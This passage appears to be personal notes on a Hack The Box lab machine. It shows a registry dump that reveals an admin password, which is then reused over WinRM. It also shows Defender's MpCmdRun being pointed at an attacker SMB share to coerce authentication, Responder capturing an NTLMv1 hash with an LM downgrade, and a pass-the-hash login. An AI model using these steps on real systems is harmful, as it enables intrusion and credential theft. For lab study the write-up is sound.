        xmlfile_.xml    REG_DWORD        0x0
        Applications\Notepad.exe_.xml   REG_DWORD        0x0
        Applications\notepad.exe_.htm   REG_DWORD        0x0
        VBSFile_.vbs    REG_DWORD        0x0
Software\Microsoft\Windows\CurrentVersion\Census\
        StartTime       REG_SZ   2026-05-18T05:47:00.050
        StartTimeBin    REG_QWORD        0x1dce689bed04320
        ReturnCode      REG_DWORD        0x0
        RunCounter      REG_DWORD        0x8
        EndTime REG_SZ   2026-05-18T05:47:11.362
Software\Microsoft\Windows\CurrentVersion\Clip\
Software\Microsoft\Windows\CurrentVersion\Clip\RefreshBannedAppList\
        BannedAppsLastModified  REG_QWORD        0x0
Software\Microsoft\Windows\CurrentVersion\Explorer\
        LogonWork       REG_DWORD        0x1
        SIDUpdatedOnLibraries   REG_DWORD        0x1
        LocalKnownFoldersMigrated       REG_DWORD        0x1
        ShellState      REG_BINARY       
        0000   24 00 00 00 34 28 00 00  00 00 00 00 00 00 00 00   $...4(..........
        0010   00 00 00 00 01 00 00 00  13 00 00 00 00 00 00 00   ................
        0020   72 00 00 00                                        r...
        SlowContextMenuEntries  REG_BINARY       
        0000   FB 9A 79 09 67 AD D1 11  AB CD 00 C0 4F C3 09 36   ..y.g.......O..6
        0010   8C 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0060   00 00 00 00                                        ....
        TelemetrySalt   REG_DWORD        0x7
Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\
        StoreAppsOnTaskbar      REG_DWORD        0x1
        ListviewAlphaSelect     REG_DWORD        0x0
        ListviewShadow  REG_DWORD        0x0
        TaskbarAnimations       REG_DWORD        0x0
        Hidden  REG_DWORD        0x2
        ShowCompColor   REG_DWORD        0x1
        HideFileExt     REG_DWORD        0x1
        DontPrettyPath  REG_DWORD        0x0
        ShowInfoTip     REG_DWORD        0x1
        HideIcons       REG_DWORD        0x0
        MapNetDrvBtn    REG_DWORD        0x0
        WebView REG_DWORD        0x1
        Filter  REG_DWORD        0x0
        ShowSuperHidden REG_DWORD        0x0
        SeparateProcess REG_DWORD        0x0
        AutoCheckSelect REG_DWORD        0x0
        IconsOnly       REG_DWORD        0x1
        ShowTypeOverlay REG_DWORD        0x1
        ShowStatusBar   REG_DWORD        0x1
Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\
        DisableAutoplay REG_DWORD        0x0
Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\EventHandlersDefaultSelection\
        (Default)       REG_SZ   
Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\UserChosenExecuteHandlers\
        (Default)       REG_SZ   
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU\
        MRUListEx       REG_BINARY       
        0000   00 00 00 00 FF FF FF FF                            ........
        0       REG_BINARY       
        0000   6E 00 6F 00 74 00 65 00  70 00 61 00 64 00 2E 00   n.o.t.e.p.a.d...
        0010   65 00 78 00 65 00 00 00  00 00 00 00 00 00 00 00   e.x.e...........
        0020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00c0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00d0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00e0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00f0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0100   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0110   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0120   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0130   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0140   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0150   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0160   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0170   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0180   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0190   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        01a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        01b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        01c0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        01d0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        01e0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        01f0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0200   00 00 00 00 00 00 00 00  1A 00 00 00 1A 00 00 00   ................
        0210   3F 05 00 00 E3 01 00 00  22 00 00 00 4D 00 00 00   ?......."...M...
        0220   5D 02 00 00 3A 02 00 00  00 00 00 00 00 00 00 00   ]...:...........
        0230   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0240   00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00   ................
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRULegacy\
        MRUListEx       REG_BINARY       
        0000   00 00 00 00 FF FF FF FF                            ........
        0       REG_BINARY       
        0000   6E 00 6F 00 74 00 65 00  70 00 61 00 64 00 2E 00   n.o.t.e.p.a.d...
        0010   65 00 78 00 65 00 00 00  14 00 1F 50 E0 4F D0 20   e.x.e......P.O. 
        0020   EA 3A 69 10 A2 D8 08 00  2B 30 30 9D 19 00 2F 44   .:i.....+00.../D
        0030   3A 5C 00 00 00 00 00 00  00 00 00 00 00 00 00 00   :\..............
        0040   00 00 00 00 00 64 00 31  00 00 00 00 00 76 52 17   .....d.1.....vR.
        0050   5E 10 00 48 59 47 49 45  4E 7E 38 00 00 4C 00 09   ^..HYGIEN~8..L..
        0060   00 04 00 EF BE 76 52 17  5E 00 00 00 00 2E 00 00   .....vR.^.......
        0070   00 04 01 00 80 00 00 00  00 00 00 00 00 00 00 00   ................
        0080   00 00 00 00 00 00 00 80  96 98 00 48 00 79 00 67   ...........H.y.g
        0090   00 69 00 65 00 6E 00 65  00 20 00 54 00 6F 00 6F   .i.e.n.e. .T.o.o
        00a0   00 6C 00 73 00 00 00 18  00 60 00 31 00 00 00 00   .l.s.....`.1....
        00b0   00 48 52 50 88 10 00 48  54 42 2D 53 43 7E 36 00   .HRP...HTB-SC~6.
        00c0   00 48 00 09 00 04 00 EF  BE 48 52 50 88 00 00 00   .H.......HRP....
        00d0   00 2E 00 00 00 D0 00 00  80 0A 00 00 00 00 00 00   ................
        00e0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 48   ...............H
        00f0   00 54 00 42 00 2D 00 53  00 63 00 72 00 69 00 70   .T.B.-.S.c.r.i.p
        0100   00 74 00 73 00 00 00 18  00 86 00 31 00 00 00 00   .t.s.......1....
        0110   00 6B 51 2F 46 10 00 57  49 4E 44 4F 7E 31 30 00   .kQ/F..WINDO~10.
        0120   00 6E 00 09 00 04 00 EF  BE 6B 51 2F 46 00 00 00   .n.......kQ/F...
        0130   00 2E 00 00 00 14 02 00  80 82 00 00 00 00 00 00   ................
        0140   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 57   ...............W
        0150   00 69 00 6E 00 64 00 6F  00 77 00 73 00 20 00 52   .i.n.d.o.w.s. .R
        0160   00 65 00 6C 00 65 00 61  00 73 00 65 00 20 00 4D   .e.l.e.a.s.e. .M
        0170   00 61 00 63 00 68 00 69  00 6E 00 65 00 20 00 43   .a.c.h.i.n.e. .C
        0180   00 68 00 65 00 63 00 6B  00 73 00 00 00 18 00 00   .h.e.c.k.s......
        0190   00                                                 .
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\*\
        0       REG_BINARY       
        0000   14 00 1F 50 E0 4F D0 20  EA 3A 69 10 A2 D8 08 00   ...P.O. .:i.....
        0010   2B 30 30 9D 19 00 2F 44  3A 5C 00 00 00 00 00 00   +00.../D:\......
        0020   00 00 00 00 00 00 00 00  00 00 00 00 00 64 00 31   .............d.1
        0030   00 00 00 00 00 76 52 17  5E 10 00 48 59 47 49 45   .....vR.^..HYGIE
        0040   4E 7E 38 00 00 4C 00 09  00 04 00 EF BE 76 52 17   N~8..L.......vR.
        0050   5E 00 00 00 00 2E 00 00  00 04 01 00 80 00 00 00   ^...............
        0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 80   ................
        0070   96 98 00 48 00 79 00 67  00 69 00 65 00 6E 00 65   ...H.y.g.i.e.n.e
        0080   00 20 00 54 00 6F 00 6F  00 6C 00 73 00 00 00 18   . .T.o.o.l.s....
        0090   00 60 00 31 00 00 00 00  00 48 52 50 88 10 00 48   .`.1.....HRP...H
        00a0   54 42 2D 53 43 7E 36 00  00 48 00 09 00 04 00 EF   TB-SC~6..H......
        00b0   BE 48 52 50 88 00 00 00  00 2E 00 00 00 D0 00 00   .HRP............
        00c0   80 0A 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00d0   00 00 00 00 00 00 00 48  00 54 00 42 00 2D 00 53   .......H.T.B.-.S
        00e0   00 63 00 72 00 69 00 70  00 74 00 73 00 00 00 18   .c.r.i.p.t.s....
        00f0   00 86 00 31 00 00 00 00  00 6B 51 2F 46 10 00 57   ...1.....kQ/F..W
        0100   49 4E 44 4F 7E 31 30 00  00 6E 00 09 00 04 00 EF   INDO~10..n......
        0110   BE 6B 51 2F 46 00 00 00  00 2E 00 00 00 14 02 00   .kQ/F...........
        0120   80 82 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0130   00 00 00 00 00 00 00 57  00 69 00 6E 00 64 00 6F   .......W.i.n.d.o
        0140   00 77 00 73 00 20 00 52  00 65 00 6C 00 65 00 61   .w.s. .R.e.l.e.a
        0150   00 73 00 65 00 20 00 4D  00 61 00 63 00 68 00 69   .s.e. .M.a.c.h.i
        0160   00 6E 00 65 00 20 00 43  00 68 00 65 00 63 00 6B   .n.e. .C.h.e.c.k
        0170   00 73 00 00 00 18 00 8A  00 32 00 6D 69 00 00 48   .s.......2.mi..H
        0180   52 74 5F 01 00 57 45 45  4B 4C 59 7E 32 2E 50 53   Rt_..WEEKLY~2.PS
        0190   31 00 00 6E 00 09 00 04  00 EF BE 48 52 74 5F 00   1..n.......HRt_.
        01a0   00 00 00 2E 00 00 00 44  00 00 00 B8 01 00 00 00   .......D........
        01b0   00 00 00 00 00 00 00 00  00 00 00 00 00 80 96 98   ................
        01c0   00 57 00 65 00 65 00 6B  00 6C 00 79 00 52 00 65   .W.e.e.k.l.y.R.e
        01d0   00 6C 00 65 00 61 00 73  00 65 00 4D 00 61 00 63   .l.e.a.s.e.M.a.c
        01e0   00 68 00 69 00 6E 00 65  00 43 00 68 00 65 00 63   .h.i.n.e.C.h.e.c
        01f0   00 6B 00 73 00 2E 00 70  00 73 00 31 00 00 00 1C   .k.s...p.s.1....
        0200   00 00 00                                           ...
        MRUListEx       REG_BINARY       
        0000   00 00 00 00 FF FF FF FF                            ........
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\ps1\
        0       REG_BINARY       
        0000   14 00 1F 50 E0 4F D0 20  EA 3A 69 10 A2 D8 08 00   ...P.O. .:i.....
        0010   2B 30 30 9D 19 00 2F 44  3A 5C 00 00 00 00 00 00   +00.../D:\......
        0020   00 00 00 00 00 00 00 00  00 00 00 00 00 64 00 31   .............d.1
        0030   00 00 00 00 00 76 52 17  5E 10 00 48 59 47 49 45   .....vR.^..HYGIE
        0040   4E 7E 38 00 00 4C 00 09  00 04 00 EF BE 76 52 17   N~8..L.......vR.
        0050   5E 00 00 00 00 2E 00 00  00 04 01 00 80 00 00 00   ^...............
        0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 80   ................
        0070   96 98 00 48 00 79 00 67  00 69 00 65 00 6E 00 65   ...H.y.g.i.e.n.e
        0080   00 20 00 54 00 6F 00 6F  00 6C 00 73 00 00 00 18   . .T.o.o.l.s....
        0090   00 60 00 31 00 00 00 00  00 48 52 50 88 10 00 48   .`.1.....HRP...H
        00a0   54 42 2D 53 43 7E 36 00  00 48 00 09 00 04 00 EF   TB-SC~6..H......
        00b0   BE 48 52 50 88 00 00 00  00 2E 00 00 00 D0 00 00   .HRP............
        00c0   80 0A 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00d0   00 00 00 00 00 00 00 48  00 54 00 42 00 2D 00 53   .......H.T.B.-.S
        00e0   00 63 00 72 00 69 00 70  00 74 00 73 00 00 00 18   .c.r.i.p.t.s....
        00f0   00 86 00 31 00 00 00 00  00 6B 51 2F 46 10 00 57   ...1.....kQ/F..W
        0100   49 4E 44 4F 7E 31 30 00  00 6E 00 09 00 04 00 EF   INDO~10..n......
        0110   BE 6B 51 2F 46 00 00 00  00 2E 00 00 00 14 02 00   .kQ/F...........
        0120   80 82 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0130   00 00 00 00 00 00 00 57  00 69 00 6E 00 64 00 6F   .......W.i.n.d.o
        0140   00 77 00 73 00 20 00 52  00 65 00 6C 00 65 00 61   .w.s. .R.e.l.e.a
        0150   00 73 00 65 00 20 00 4D  00 61 00 63 00 68 00 69   .s.e. .M.a.c.h.i
        0160   00 6E 00 65 00 20 00 43  00 68 00 65 00 63 00 6B   .n.e. .C.h.e.c.k
        0170   00 73 00 00 00 18 00 8A  00 32 00 6D 69 00 00 48   .s.......2.mi..H
        0180   52 74 5F 01 00 57 45 45  4B 4C 59 7E 32 2E 50 53   Rt_..WEEKLY~2.PS
        0190   31 00 00 6E 00 09 00 04  00 EF BE 48 52 74 5F 00   1..n.......HRt_.
        01a0   00 00 00 2E 00 00 00 44  00 00 00 B8 01 00 00 00   .......D........
        01b0   00 00 00 00 00 00 00 00  00 00 00 00 00 80 96 98   ................
        01c0   00 57 00 65 00 65 00 6B  00 6C 00 79 00 52 00 65   .W.e.e.k.l.y.R.e
        01d0   00 6C 00 65 00 61 00 73  00 65 00 4D 00 61 00 63   .l.e.a.s.e.M.a.c
        01e0   00 68 00 69 00 6E 00 65  00 43 00 68 00 65 00 63   .h.i.n.e.C.h.e.c

```

use the kali terminal search function to find the password , remember to unclick the match case

![Pasted image 20260518151603.png](/ob/Pasted%20image%2020260518151603.png)

I will use kali search to find the Password and Username

get the password and user

```
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht

```

```
┌──(root㉿kali)-[~/Desktop]
└─# for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto htb.local  -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'; done

[*] Testing smb...
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht 

[*] Testing winrm...
WINRM       dead:beef::b885:d62a:d679:573f 5985   APT              [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       dead:beef::b885:d62a:d679:573f 5985   APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht (Pwn3d!)                                                                                                                 

[*] Testing wmi...
RPC         dead:beef::b885:d62a:d679:573f 135    APT              [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local)
RPC         dead:beef::b885:d62a:d679:573f 135    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht 

[*] Testing rdp...
[-] Schema mismatch detected for table 'hosts' in protocol 'RDP'
[-] This is probably because a newer version of nxc is being run on an old DB schema.
[-] Optionally save the old DB data (`cp /root/.nxc/workspaces/default/rdp.db ~/nxc_rdp.bak`)
[-] Then remove the RDP DB (`rm -f /root/.nxc/workspaces/default/rdp.db`) and run nxc to initialize the new DB

[*] Testing ssh...


[*] Testing ldap...
LDAP        dead:beef::b885:d62a:d679:573f 389    APT              [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local) (signing:None) (channel binding:Never)                                                                                                                                                                  
LDAP        dead:beef::b885:d62a:d679:573f 389    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht 

[*] Testing mssql...
[-] Schema mismatch detected for table 'loggedin_relations' in protocol 'MSSQL'
[-] This is probably because a newer version of nxc is being run on an old DB schema.
[-] Optionally save the old DB data (`cp /root/.nxc/workspaces/default/mssql.db ~/nxc_mssql.bak`)
[-] Then remove the MSSQL DB (`rm -f /root/.nxc/workspaces/default/mssql.db`) and run nxc to initialize the new DB

[*] Testing ftp...

```

```
┌──(root㉿kali)-[~/Desktop]
└─# evil-winrm-py -i htb.local  -u henry.vinson_adm  -p G1#Ny5@2dvht                   
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'htb.local:5985' as 'henry.vinson_adm'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\henry.vinson_adm\Documents>

```

b0cd699594ccb0e522e9fba3ad88040f

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-powershell-history" >}} There is a PowerShell history file  in the henry.vinson\_adm account’s directory:

{{< /toggle >}}

```
C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline\ConsoleHost_history.txt
```

There is a [PowerShell history file](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html) in the henry.vinson\_adm account’s directory:

```
evil-winrm-py PS C:\Users\henry.vinson_adm\Desktop> type C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline\ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
evil-winrm-py PS C:\Users\henry.vinson_adm\Desktop>

```

```
evil-winrm-py PS C:\Users\henry.vinson_adm\Desktop> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel


lmcompatibilitylevel : 2
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
PSChildName          : Lsa
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry




```

[Seatbelt](https://github.com/GhostPack/Seatbelt#command-groups) is another enumeration script writing in C#. It has the same issues with AMSI/Defender as WinPEAS, and can be bypassed the same way.

```
evil-winrm-py PS C:\Program Files\Windows Defender> dir


    Directory: C:\Program Files\Windows Defender


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----       11/21/2016   1:53 AM                en-US                                                                  
d-----        9/24/2020   9:15 AM                platform                                                               
-a----        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof                                                
-a----         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll                                               
-a----        7/16/2016   2:12 PM          21004 AmStatusInstall.mof                                                    
-a----        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof                                                   
-a----         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe                                               
-a----        3/28/2017   6:23 AM         224256 DataLayer.dll                                                          
-a----        7/16/2016   2:12 PM        1514688 DbgHelp.dll                                                            
-a----        7/16/2016   2:12 PM         724480 EppManifest.dll                                                        
-a----        7/16/2016   2:12 PM            361 FepUnregister.mof                                                      
-a----         3/4/2021   5:03 AM          86528 MpAsDesc.dll                                                           
-a----         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll                                                         
-a----         3/4/2021   4:55 AM         928768 MpClient.dll                                                           
-a----         3/4/2021   5:42 AM         377648 MpCmdRun.exe                                                           
-a----         3/4/2021   4:58 AM         335360 MpCommu.dll                                                            
-a----        7/16/2016   2:12 PM         113152 MpEvMsg.dll                                                            
-a----         3/4/2021   5:01 AM         101888 MpOAV.dll                                                              
-a----         1/7/2021  10:55 PM         178176 MpProvider.dll                                                         
-a----         3/4/2021   4:57 AM         526336 MpRtp.dll                                                              
-a----         3/4/2021   4:55 AM        2000384 MpSvc.dll                                                              
-a----         3/4/2021   5:02 AM          76288 MsMpCom.dll                                                            
-a----         3/4/2021   5:42 AM          97184 MsMpEng.exe                                                            
-a----         3/4/2021   5:05 AM           4608 MsMpLics.dll                                                           
-a----         3/4/2021   5:03 AM          53248 NisLog.dll                                                             
-a----         3/4/2021   5:48 AM         339400 NisSrv.exe                                                             
-a----         3/4/2021   5:03 AM          66048 NisWfp.dll                                                             
-a----        4/28/2017  12:52 AM         551424 ProtectionManagement.dll                                               
-a----        7/16/2016   2:12 PM          57424 ProtectionManagement.mof                                               
-a----        7/16/2016   2:12 PM           2570 ProtectionManagement_Uninstall.mof                                     
-a----        7/16/2016   2:12 PM         156864 SymSrv.dll                                                             
-a----        7/16/2016   2:12 PM              1 SymSrv.yes                                                             
-a----        7/16/2016   2:12 PM           1091 ThirdPartyNotices.txt                                                  


```

https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/

```
evil-winrm-py PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.45\share\file.txt
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to crypto and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information

```

```
┌──(root㉿kali)-[~/Desktop]
└─# responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Force ESS downgrade        [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.45]
    Responder IPv6             [dead:beef:2::102b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-93GBQ7GK1WQ]
    Responder Domain Name      [SNHD.LOCAL]
    Responder DCE-RPC Port     [45030]

[*] Version: Responder 3.2.0.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                    

[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:74B418D73A74AAD724CEC4EF251D3CBE67A436A14F26B381:74B418D73A74AAD724CEC4EF251D3CBE67A436A14F26B381:62ae5866d3b2487f                                         
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$

```

The next I think is unreal

```
evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb
```

![Pasted image 20260518163558.png](/ob/Pasted%20image%2020260518163558.png)
